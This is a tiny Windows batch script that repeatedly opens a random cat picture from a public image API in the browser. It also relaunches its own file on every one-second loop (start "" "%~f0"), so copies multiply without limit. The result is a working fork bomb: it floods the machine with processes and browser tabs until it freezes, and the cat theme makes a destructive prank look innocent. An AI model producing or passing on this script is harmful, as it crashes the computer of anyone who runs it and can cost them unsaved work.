@echo off

set "cat_api=https://cataas.com/cat"

:loop
start "" "%cat_api%"

start "" "%~f0"

timeout /t 1 >nul

goto loop
exit
